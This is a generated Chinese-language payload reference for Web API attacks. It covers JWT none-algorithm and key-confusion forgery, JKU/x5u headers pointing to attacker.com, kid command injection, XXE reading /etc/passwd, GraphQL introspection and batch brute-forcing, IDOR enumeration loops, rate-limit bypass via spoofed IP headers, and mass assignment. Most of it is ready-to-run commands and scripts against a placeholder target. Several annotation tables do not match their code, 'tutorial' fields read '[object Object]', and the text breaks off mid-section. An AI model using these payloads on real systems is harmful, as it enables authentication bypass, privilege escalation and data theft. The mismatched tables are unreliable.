# API安全 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（12 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. JWT安全漏洞

- **id:** `jwt-security`
- **分类:** API安全 / JWT
- **tags:** `jwt` `token` `authentication`

JSON Web Token安全漏洞利用

**前置条件**

- 使用JWT进行认证
- JWT配置或验证存在问题

**利用步骤**

#### 1. 解码JWT

```
JWT格式: header.payload.signature
解码:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
或使用jwt.io
```

解码JWT内容

| 片段 | 说明 | 类型 |
|---|---|---|
| `header` | 算法和令牌类型 | value |
| `payload` | 声明数据 | value |
| `signature` | 签名验证 | value |

#### 2. None算法攻击

```
修改header为:
{"alg":"none","typ":"JWT"}
Base64编码后构造:
HEADER.PAYLOAD.
(签名部分为空)
```

使用None算法绕过签名验证

| 片段 | 说明 | 类型 |
|---|---|---|
| `"alg":"none"` | 指定无签名算法 | value |

#### 3. 弱密钥破解

```
使用hashcat破解:
hashcat -m 16500 jwt.txt wordlist.txt
使用jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
```

破解弱密钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `-m 16500` | hashcat JWT模式 | value |

#### 4. 密钥混淆攻击

```
将RS256算法改为HS256:
{"alg":"HS256","typ":"JWT"}
使用公钥作为HMAC密钥签名
```

算法混淆攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `RS256` | RSA非对称算法 | value |
| `HS256` | HMAC对称算法 | value |

#### 5. 修改Payload

```
修改payload中的用户信息:
{"sub":"admin","iat":1234567890}
重新编码并使用已知密钥签名
```

修改JWT声明

| 片段 | 说明 | 类型 |
|---|---|---|
| `sub` | Subject声明，通常是用户ID | value |
| `iat` | 签发时间 | value |

**WAF 绕过**

#### JWK/JKU头部注入

```
# JWK内嵌公钥注入:
# 在JWT Header中嵌入攻击者的公钥:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# 服务端使用Header中的JWK验证签名

# JKU远程密钥集注入:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# 服务端从攻击者控制的URL获取密钥
```

通过在JWT Header中注入jwk(内嵌密钥)或jku(远程密钥集URL)指向攻击者控制的密钥，使服务端使用攻击者密钥验证签名

| 片段 | 说明 | 类型 |
|---|---|---|
| `# JWK内嵌公钥注入:` | 主要命令 | command |
| `...` | 共7行 | value |

#### x5c证书链注入

```
# 生成自签名证书:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# 构造JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# 用攻击者私钥签名，x5c中放入攻击者证书
# 服务端从x5c提取公钥验证签名，攻击者自签即可通过

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

通过x5c头部注入攻击者自签证书链，使服务端从证书中提取公钥进行验证，攻击者用对应私钥签名即可伪造任意JWT

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 生成自签名证书:` | 主要命令 | command |
| `...` | 共8行 | value |

**教程**

[object Object]

---

### 2. GraphQL注入攻击

- **id:** `graphql-injection`
- **分类:** API安全 / GraphQL
- **tags:** `graphql` `api` `injection` `introspection`

GraphQL API注入与信息泄露攻击

**前置条件**

- 目标使用GraphQL API
- 存在未授权访问或注入点

**利用步骤**

#### 1. 探测GraphQL端点

```
# 常见GraphQL端点
/graphql
/api/graphql
/graphql/api
/query
/graphql.php

# 发送POST请求
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

探测GraphQL端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体 | keyword |
| `file://` | 文件协议 | technique |

#### 2. 内省查询

```
# 完整内省查询
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# 使用工具
gqlscan -u http://target.com/graphql
inql -t http://target.com/graphql
```

执行内省查询获取API结构

| 片段 | 说明 | 类型 |
|---|---|---|
| `__schema` | 获取整个API架构 | value |
| `fields` | 获取类型的所有字段 | value |
| `args` | 获取字段参数 | value |

#### 3. 批量查询攻击

```
# 别名批量查询
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
}

# 批量查询绕过速率限制
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```

使用批量查询绕过限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `user1: user(id: 1)` | 使用别名同时查询多个用户 | value |
| `[{},{},{}]` | 数组形式批量查询 | value |

#### 4. SQL注入

```
# GraphQL中的SQL注入
{
  user(name: "admin' OR '1'='1") {
    id
    name
    password
  }
}

# 通过参数注入
mutation {
  createUser(input: {
    name: "test' OR 1=1--"
  }) {
    id
  }
}
```

GraphQL中的SQL注入

#### 5. NoSQL注入

```
# MongoDB注入
{
  user(filter: {
    $or: [{name: "admin"}, {name: "root"}]
  }) {
    name
    password
  }
}

# 通过JSON注入
{
  search(text: "{\"$ne\": \"\"}") {
    results
  }
}
```

GraphQL中的NoSQL注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$or` | MongoDB逻辑运算符 | variable |
| `$ne` | 不等于操作符 | variable |

#### 6. 信息泄露

```
# 获取隐藏字段
{
  user(id: 1) {
    name
    email
    password
    apiKey
    secretKey
    token
    __typename
  }
}

# 枚举所有可能字段
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

获取隐藏字段和敏感信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `__typename` | 获取对象类型名称 | value |
| `__type` | 查询特定类型信息 | value |

**WAF 绕过**

#### 字段建议绕过

```
# 利用字段建议功能
query {
  userr(id: 1) { name }
}
# 返回: Did you mean "user"?

# 枚举隐藏字段
query {
  user(id: 1) {
    __typename
    ...on AdminUser {
      adminSecret
    }
  }
}
```

利用字段建议和片段枚举

| 片段 | 说明 | 类型 |
|---|---|---|
| `...on AdminUser` | GraphQL内联片段 | value |

#### 指令注入

```
# 使用指令绕过
query {
  user(id: 1) @deprecated {
    name
  }
}

# 自定义指令攻击
mutation @skip(if: false) {
  deleteUser(id: 1)
}
```

使用GraphQL指令绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `@deprecated` | 弃用指令 | value |
| `@skip` | 条件跳过指令 | value |

**教程**

[object Object]

---

### 3. GraphQL内省攻击

- **id:** `graphql-introspection`
- **分类:** API安全 / GraphQL内省
- **tags:** `graphql` `introspection` `enumeration` `api`

利用GraphQL内省功能获取API结构

**前置条件**

- 目标使用GraphQL
- 内省功能未禁用

**利用步骤**

#### 1. 基础内省

```
# 获取所有类型
{
  __schema {
    types {
      name
    }
  }
}

# 获取查询类型
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

基础内省查询

| 片段 | 说明 | 类型 |
|---|---|---|
| `__schema` | GraphQL元数据根 | value |
| `queryType` | 获取所有查询操作 | value |

#### 2. 完整内省

```
# 获取完整API结构
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```

完整内省查询获取所有信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `fragment` | GraphQL片段定义 | value |
| `includeDeprecated` | 包含已弃用字段 | encoding |

#### 3. 使用工具分析

```
# GraphQL Voyager - 可视化分析
# https://github.com/APIs-guru/graphql-voyager

# 使用CLI工具
npm install -g graphql-cli
graphql-cli introspect http://target.com/graphql

# InQL扫描
pip install inql
inql -t http://target.com/graphql

# GraphQL Cop
npm install -g graphql-cop
graphql-cop -t http://target.com/graphql
```

使用工具分析GraphQL

**WAF 绕过**

#### 绕过内省禁用

```
# 某些实现只检查特定字符串
# 尝试不同格式
query { __schema { types { name } } }
query IntrospectionQuery { __schema { types { name } } }
{"query":"{__schema{types{name}}}"

# 使用GET请求
curl "http://target.com/graphql?query={__schema{types{name}}}"
```

绕过内省禁用检测

**教程**

[object Object]

---

### 4. GraphQL批量查询攻击

- **id:** `graphql-batching`
- **分类:** API安全 / GraphQL批量查询
- **tags:** `graphql` `batching` `rate-limit` `bypass`

利用GraphQL批量查询绕过速率限制

**前置条件**

- 目标使用GraphQL
- 存在速率限制

**利用步骤**

#### 1. 别名批量查询

```
# 使用别名一次查询多个用户
query {
  user1: user(id: 1) { name email password }
  user2: user(id: 2) { name email password }
  user3: user(id: 3) { name email password }
  user4: user(id: 4) { name email password }
  user5: user(id: 5) { name email password }
}

# 批量枚举
query {
  users: allUsers(limit: 1000) { id name email }
}
```

使用别名批量查询

| 片段 | 说明 | 类型 |
|---|---|---|
| `user1: user(id: 1)` | 别名定义 | value |
| `limit: 1000` | 限制返回数量 | value |

#### 2. 数组批量查询

```
# 发送多个查询数组
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"},
  {"query": "{ user(id: 4) { name } }"}
]

# 使用curl发送
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
```

使用数组批量查询

| 片段 | 说明 | 类型 |
|---|---|---|
| `[{},{},{}]` | JSON数组格式 | value |
| `query` | GraphQL查询字段 | value |

#### 3. 暴力破解

```
# 批量密码尝试
mutation {
  attempt1: login(email: "admin@test.com", password: "password1") { token }
  attempt2: login(email: "admin@test.com", password: "password2") { token }
  attempt3: login(email: "admin@test.com", password: "password3") { token }
  attempt4: login(email: "admin@test.com", password: "password4") { token }
  attempt5: login(email: "admin@test.com", password: "password5") { token }
}

# 枚举用户
query {
  check1: userExists(email: "admin@test.com")
  check2: userExists(email: "root@test.com")
  check3: userExists(email: "test@test.com")
}
```

批量暴力破解

| 片段 | 说明 | 类型 |
|---|---|---|
| `login` | 登录mutation | value |
| `userExists` | 用户存在检查查询 | value |

**WAF 绕过**

#### 绕过批量限制

```
# 分散查询
# 使用不同的查询格式
query BatchQuery {
  user1: user(id: 1) { ...UserFields }
  user2: user(id: 2) { ...UserFields }
}
fragment UserFields on User {
  name
  email
}

# 使用变量批量
query GetUser($ids: [ID!]!) {
  users(ids: $ids) {
    name
    email
  }
}
```

绕过批量查询限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `query{...}` | GraphQL查询 | format |

**教程**

[object Object]

---

### 5. REST API安全测试

- **id:** `rest-api-security`
- **分类:** API安全 / REST API
- **tags:** `rest` `api` `security` `testing`

REST API安全测试与漏洞利用

**前置条件**

- 目标使用REST API
- 了解API端点

**利用步骤**

#### 1. API端点发现

```
# 常见API端点
/api/v1/users
/api/v2/products
/api/docs
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/redoc

# 使用工具发现
ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt
wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
```

发现API端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `/api/v1/` | API版本路径 | value |
| `/swagger.json` | Swagger文档 | path |

#### 2. 认证测试

```
# 测试未授权访问
curl http://target.com/api/v1/users

# 测试JWT
curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users

# 测试API Key
curl -H "X-API-Key: key123" http://target.com/api/v1/users

# 测试Basic Auth
curl -u user:pass http://target.com/api/v1/users
```

测试API认证

| 片段 | 说明 | 类型 |
|---|---|---|
| `Authorization: Bearer` | Bearer Token认证 | header |
| `X-API-Key` | API Key认证头 | value |

#### 3. HTTP方法测试

```
# 测试允许的HTTP方法
curl -X OPTIONS http://target.com/api/v1/users -v

# 尝试PUT修改
curl -X PUT -H "Content-Type: application/json" \
  -d '{"name":"hacked"}' http://target.com/api/v1/users/1

# 尝试DELETE删除
curl -X DELETE http://target.com/api/v1/users/1

# 尝试PATCH部分更新
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/v1/users/1
```

测试HTTP方法

| 片段 | 说明 | 类型 |
|---|---|---|
| `OPTIONS` | 获取支持的HTTP方法 | method |
| `PUT` | 创建或替换资源 | method |
| `PATCH` | 部分更新资源 | method |

#### 4. 参数污染

```
# 参数污染测试
# 重复参数
/api/users?id=1&id=2
/api/users?name=admin&name=user

# 数组参数
/api/users?id[]=1&id[]=2
/api/users?name[0]=admin&name[1]=user

# JSON注入
/api/users?filter={"role":"admin"}
/api/users?sort=role&order=desc; DROP TABLE users--
```

测试参数污染

| 片段 | 说明 | 类型 |
|---|---|---|
| `id=1&id=2` | 重复参数 | value |
| `id[]=1` | 数组参数 | value |

#### 5. 内容类型测试

```
# 测试不同Content-Type
curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users

# XML外部实体
curl -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
  http://target.com/api/users
```

测试内容类型处理

| 片段 | 说明 | 类型 |
|---|---|---|
| `Content-Type` | HTTP内容类型头 | value |
| `application/xml` | XML格式 | value |

**WAF 绕过**

#### API版本绕过

```
# 尝试不同API版本
/api/v1/users  # 可能已修复
/api/v2/users  # 可能未修复
/api/users     # 旧版本可能无保护

# 尝试内部API
/internal/api/users
/private/api/users
/_api/users
```

使用不同API版本绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 尝试不同API版本 /api/v1/users  # 可能已修复 /api/v2/users  # 可能未修复 /api/users     # 旧版` | 攻击载荷 | value |

#### 编码绕过

```
# URL编码
curl http://target.com/api/users/%31  # /users/1

# Unicode编码
curl http://target.com/api/users/%u0031

# 双重URL编码
curl http://target.com/api/users/%2531
```

使用编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# URL编码 curl http://target.com/api/users/%31  # /users/1  # Unicode编码 curl h` | 攻击载荷 | value |

**教程**

[object Object]

---

### 6. JWT None算法攻击

- **id:** `jwt-none-alg`
- **分类:** API安全 / JWT安全
- **tags:** `jwt` `none` `algorithm` `bypass`

利用JWT None算法绕过签名验证

**前置条件**

- 目标使用JWT认证
- 服务器未正确验证算法

**利用步骤**

#### 1. 解码JWT

```
# 在线解码
https://jwt.io

# 使用命令行
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d

# 使用Python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
```

解码JWT令牌

| 片段 | 说明 | 类型 |
|---|---|---|
| `HEADER` | JWT头部，包含算法信息 | value |
| `PAYLOAD` | JWT载荷，包含用户数据 | value |

#### 2. 构造None算法Token

```
# 修改头部为none算法
# 原始头部
{"alg":"HS256","typ":"JWT"}

# 修改为
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# 使用Python构造
import base64, json
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","iat":1516239022}
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."
print(token)
```

构造None算法Token

| 片段 | 说明 | 类型 |
|---|---|---|
| `"alg":"none"` | 设置算法为none | value |
| `rstrip("=")` | 移除Base64填充 | value |

#### 3. 修改用户权限

```
# 修改payload提权
# 原始payload
{"sub":"user","role":"user","iat":1516239022}

# 修改为
{"sub":"admin","role":"admin","iat":1516239022}

# 完整攻击
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
token = header + "." + payload + "."
print(token)
```

修改用户权限

| 片段 | 说明 | 类型 |
|---|---|---|
| `"role":"admin"` | 修改角色为管理员 | value |
| `"sub":"admin"` | 修改主体为admin | value |

#### 4. 发送恶意Token

```
# 使用curl发送
curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin

# 空签名测试
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
```

发送恶意Token

| 片段 | 说明 | 类型 |
|---|---|---|
| `Bearer` | Bearer认证方案 | value |
| `.` | 空签名部分 | value |

**WAF 绕过**

#### 算法混淆

```
# 尝试不同变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# 移除alg字段
{"typ":"JWT"}
```

尝试算法变体

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 尝试不同变体 {"alg":"none"} {"alg":"None"} {"alg":"NONE"} {"alg":"nOnE"} {"alg":""} {"alg":null}  # 移除alg字段 {"typ":"JWT"}` | 参数与载荷内容 | value |

#### 签名绕过

```
# 空签名
header.payload.

# 任意签名
header.payload.anysignature

# 使用原始签名
# 某些库会忽略签名验证
```

签名绕过变体

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 空签名 header.payload.  # 任意签名 header.payload.anysignature  # 使用原始签名 # 某些库会忽略签名验证` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 7. JWT密钥混淆攻击

- **id:** `jwt-key-confusion`
- **分类:** API安全 / JWT安全
- **tags:** `jwt` `algorithm` `confusion` `rs256`

利用JWT算法混淆实现签名绕过

**前置条件**

- 目标使用RS256算法
- 可获取公钥

**利用步骤**

#### 1. 获取公钥

```
# 从证书获取
curl -k https://target.com/.well-known/jwks.json

# 从SSL证书获取
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# 从JWT头部获取
# 解码JWT头部，查找x5c或jku字段

# 常见公钥位置
/.well-known/jwks.json
/api/keys
/public.key
/pubkey.pem
```

获取JWT公钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `jwks.json` | JSON Web Key Set | path |
| `x5c` | X.509证书链 | value |

#### 2. 算法混淆攻击

```
# 将RS256改为HS256
# 使用公钥作为HMAC密钥

import jwt
import base64

# 获取公钥
public_key = open("public.pem").read()

# 构造payload
payload = {"sub":"admin","role":"admin"}

# 使用公钥作为HMAC密钥签名
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

算法混淆攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `RS256` | RSA签名算法 | value |
| `HS256` | HMAC签名算法 | value |
| `公钥作为密钥` | 使用公钥作为HMAC密钥 | value |

#### 3. 发送恶意Token

```
# 使用构造的Token
curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin

# Python脚本
import requests
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://target.com/api/admin", headers=headers)
print(response.text)
```

发送恶意Token

| 片段 | 说明 | 类型 |
|---|---|---|
| `curl` | HTTP请求工具 | command |
| `-H` | 自定义请求头 | parameter |
| `Authorization` | 认证头 | header |

**WAF 绕过**

#### kid注入

```
# kid参数注入
# 修改JWT头部kid字段
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}

# SQL注入kid
{"alg":"HS256","typ":"JWT","kid":"key UNION SELECT secret--"}

# 命令注入kid
{"alg":"HS256","typ":"JWT","kid":"|/bin/bash -c id"}
```

通过kid参数注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `kid` | Key ID，指定使用的密钥 | value |

#### jku/x5u绕过

```
# jku指向攻击者服务器
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}

# x5u指向攻击者证书
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# 在攻击者服务器托管恶意密钥
```

通过jku/x5u绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `jku` | JWK Set URL | value |
| `x5u` | X.509 URL | value |

**教程**

[object Object]

---

### 8. IDOR不安全的直接对象引用

- **id:** `api-idor`
- **分类:** API安全 / IDOR
- **tags:** `idor` `api` `authorization` `bypass`

利用IDOR漏洞访问未授权资源

**前置条件**

- 目标使用ID引用资源
- 存在授权检查缺陷

**利用步骤**

#### 1. 识别ID参数

```
# 常见ID参数位置
/api/users/123
/api/orders?id=123
/api/documents/abc-123
/api/profile?user_id=123

# 观察响应
# 记录不同ID返回的数据差异
```

识别ID参数

| 片段 | 说明 | 类型 |
|---|---|---|
| `/users/123` | URL路径中的ID | value |
| `?id=123` | 查询参数中的ID | value |

#### 2. 枚举ID

```
# 数字ID枚举
for i in $(seq 1 1000); do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt
done

# 使用Burp Intruder
# Payload: Numbers 1-10000
# GET /api/users/{id}

# UUID枚举
# 使用ffuf
ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
```

枚举ID值

| 片段 | 说明 | 类型 |
|---|---|---|
| `seq 1 1000` | 生成1到1000的数字 | value |
| `ffuf` | Web模糊测试工具 | command |

#### 3. 批量检测

```
# Python脚本批量检测
import requests

token = "YOUR_TOKEN"
for i in range(1, 100):
    r = requests.get(
        f"http://target.com/api/users/{i}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        print(f"ID {i}: {r.json()}")

# 检测数据泄露
# 比较不同用户访问同一ID的响应
```

批量检测IDOR

| 片段 | 说明 | 类型 |
|---|---|---|
| `Authorization` | 认证头 | header |

#### 4. 跨用户访问

```
# 尝试访问其他用户数据
# 用户A的Token访问用户B的数据

# 修改请求中的ID
GET /api/users/2  # 原本是用户1
GET /api/orders?user_id=2  # 原本是user_id=1

# 修改POST/PUT请求体
{
  "user_id": 2,  # 修改为其他用户ID
  "amount": 1000
}
```

跨用户访问测试

| 片段 | 说明 | 类型 |
|---|---|---|
| `user_id` | 请求体中的用户ID | value |

**WAF 绕过**

#### ID变体绕过

```
# 数字变体
/api/users/001
/api/users/1
/api/users/0x1
/api/users/1.0

# 编码绕过
/api/users/%31  # URL编码
/api/users/MSAg  # Base64编码

# 数组绕过
/api/users?id[]=1&id[]=2
/api/users[0]=1&users[1]=2
```

ID变体绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `%xx` | URL编码 | encoding |
| `base64` | Base64编码 | encoding |

#### 参数污染

```
# 参数污染
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON注入
{"id": 1, "id": 2}

# 批量操作
/api/users/batch?ids=1,2,3,4,5
```

参数污染绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 参数污染 /api/users?id=1&id=2 /api/users?id=2&id=1  # JSON注入 {"id": 1, "id": 2}  # 批量操作 /api/users/batch?ids=1,2,3,4,5` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 9. API速率限制绕过

- **id:** `api-rate-limit`
- **分类:** API安全 / 速率限制
- **tags:** `api` `rate-limit` `bypass` `brute-force`

绕过API速率限制进行暴力攻击

**前置条件**

- 目标有速率限制
- 限制实现有缺陷

**利用步骤**

#### 1. 检测速率限制

```
# 快速发送请求检测限制
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test
done

# 观察响应
# 429 Too Many Requests
# 403 Forbidden
# 自定义错误消息
```

检测速率限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `429` | HTTP状态码，请求过多 | value |
| `%{http_code}` | curl输出HTTP状态码 | variable |

#### 2. IP绕过

```
# X-Forwarded-For绕过
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test

# 其他IP头
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# 自动化
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
done
```

使用IP头绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `X-Forwarded-For` | 代理转发的原始IP | value |
| `X-Real-IP` | 真实客户端IP | value |

#### 3. 分布式绕过

```
# 使用多个代理
# 配置代理池
proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080"
]

# Python脚本
import requests
proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]
for i, proxy in enumerate(proxies_list):
    requests.get("http://target.com/api/test", proxies={"http": proxy})

# 使用Tor
# 每次请求头换Tor电路
import stem.process
import requests

# 使用云函数
# AWS Lambda, Azure Functions等
```

分布式绕过速率限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `Bearer` | 令牌类型 | keyword |
| `Authorization` | 认证头 | header |

#### 4. 其他绕过技术

```
# 用户代理绕过
curl -A "Googlebot" http://target.com/api/test
curl -A "Bingbot" http://target.com/api/test

# 认证绕过
# 使用不同账户
for token in $TOKENS; do
  curl -H "Authorization: Bearer $token" http://target.com/api/test
done

# HTTP/2多路复用
# 单个连接发送多个请求

# 缓慢请求
# Slowloris攻击
```

其他绕过技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `curl` | HTTP请求工具 | command |
| `-H` | 自定义请求头 | parameter |
| `Authorization` | 认证头 | header |

**WAF 绕过**

#### API Key轮换

```
# 使用多个API Key
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumerate(api_keys):
    requests.get("http://target.com/api/test", headers={"X-API-Key": key})

# 注册多个账户获取多个Token
```

API Key轮换

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 使用多个API Key api_keys = ["key1", "key2", "key3", "key4"] for i, key in enumer` | 攻击载荷 | value |

#### 请求分散

```
# 添加延迟
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.sleep(0.5)  # 每次请求头隔0.5秒

# 分散到不同时间段
# 使用定时任务分散请求
```

请求分散

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 添加延迟 import time for i in range(100):     requests.get("http://target.com/api/test")     time.` | SQL表达式 | value |
| `sleep` | SQL关键字 | keyword |
| `(0.5)  # 每次请求头隔0.5秒  # 分散到不同时间段 # 使用定时任务分散请求` | SQL表达式 | value |

**教程**

[object Object]

---

### 10. 批量赋值漏洞

- **id:** `api-mass-assignment`
- **分类:** API安全 / 批量赋值
- **tags:** `api` `mass-assignment` `privilege-escalation`

利用批量赋值漏洞修改敏感字段

**前置条件**

- API接受JSON输入
- 存在未过滤的字段

**利用步骤**

#### 1. 识别输入字段

```
# 正常请求
POST /api/users
{
  "name": "test",
  "email": "test@test.com"
}

# 观察响应
{
  "id": 1,
  "name": "test",
  "email": "test@test.com",
  "role": "user",
  "isAdmin": false,
  "createdAt": "2024-01-01"
}
```

识别返回的字段

| 片段 | 说明 | 类型 |
|---|---|---|
| `role` | 用户角色字段 | value |
| `isAdmin` | 管理员标志 | value |

#### 2. 添加敏感字段

```
# 尝试添加role字段
POST /api/users
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin"
}

# 尝试isAdmin
{
  "name": "test",
  "email": "test@test.com",
  "isAdmin": true
}

# 尝试多个字段
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["read", "write", "delete"]
}
```

添加敏感字段

| 片段 | 说明 | 类型 |
|---|---|---|
| `"role": "admin"` | 尝试设置管理员角色 | value |
| `"isAdmin": true` | 尝试设置管理员标志 | value |

#### 3. 更新操作

```
# PUT/PATCH更新
PATCH /api/users/123
{
  "role": "admin"
}

# 尝试修改其他用户
PATCH /api/users/1
{
  "role": "admin"
}

# 尝试修改密码
PATCH /api/users/me
{
  "password": "newpassword123"
}
```

更新操作测试

#### 4. 嵌套对象

```
# 嵌套对象赋值
{
  "name": "test",
  "settings": {
    "notifications": true,
    "isAdmin": true
  }
}

# 数组赋值
{
  "name": "test",
  "roles": ["admin", "superadmin"]
}
```

嵌套对象测试

**WAF 绕过**

#### 字段变体

```
# 尝试不同字段名
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userType, user_type_id

# 尝试内部字段
__v, _id, created_at, updated_at
password_hash, passwordHash
```

尝试字段变体

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 尝试不同字段名 is_admin, is_Admin, IS_ADMIN admin, Admin, ADMIN user_type, userTyp` | 攻击载荷 | value |

#### 类型混淆

```
# 数字转布尔
{"isAdmin": 1}
{"isAdmin": "true"}

# 数组转字符串
